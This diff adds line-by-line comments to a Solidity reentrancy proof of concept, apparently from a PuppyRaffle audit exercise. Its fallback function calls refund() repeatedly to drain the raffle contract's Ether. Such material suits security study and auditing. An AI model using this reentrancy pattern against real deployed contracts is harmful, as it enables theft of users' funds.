@@ -125,33 +125,34 @@ pragma solidity ^0.7.6;
 import "./PuppyRaffle.sol";
 
 contract AttackContract {
-    PuppyRaffle public puppyRaffle;
-    uint256 public receivedEther;
+    PuppyRaffle public puppyRaffle; // A reference to the PuppyRaffle contract being attacked.
+    uint256 public receivedEther; // Tracks the total amount of Ether received by the attacking contract.
 
     constructor(PuppyRaffle _puppyRaffle) {
-        puppyRaffle = _puppyRaffle;
+        puppyRaffle = _puppyRaffle; // Initializes the attack contract by linking it to the deployed PuppyRaffle instance.
     }
 
     function attack() public payable {
-        require(msg.value > 0);
+        require(msg.value > 0); // Ensures the attacker sends Ether to fund the attack.
 
         // Create a dynamic array and push the sender's address
-        address[] memory players = new address[](1);
-        players[0] = address(this);
+        address[] memory players = new address[](1); // Creates a dynamic array of addresses.
+        players[0] = address(this); // Adds the attacking contract's address to the players array.
 
-        puppyRaffle.enterRaffle{value: msg.value}(players);
+        puppyRaffle.enterRaffle{value: msg.value}(players); // Calls the enterRaffle function on the PuppyRaffle contract, passing the attacking contract as a participant.
     }
 
     fallback() external payable {
+        // Checks if the PuppyRaffle contract has sufficient balance to continue the attack.
         if (address(puppyRaffle).balance >= msg.value) {
-            receivedEther += msg.value;
+            receivedEther += msg.value; // Updates the Ether received by the attacking contract during the attack.
 
-            // Find the index of the sender's address
+            // Retrieves the index of the attacking contract in the players array.
             uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
 
+            // Ensures that the attacking contract is a valid participant.
             if (playerIndex > 0) {
-                // Refund the sender if they are in the raffle
-                puppyRaffle.refund(playerIndex);
+                puppyRaffle.refund(playerIndex); // Calls the refund function on the PuppyRaffle contract to trigger a reentrancy attack.
             }
         }
     }
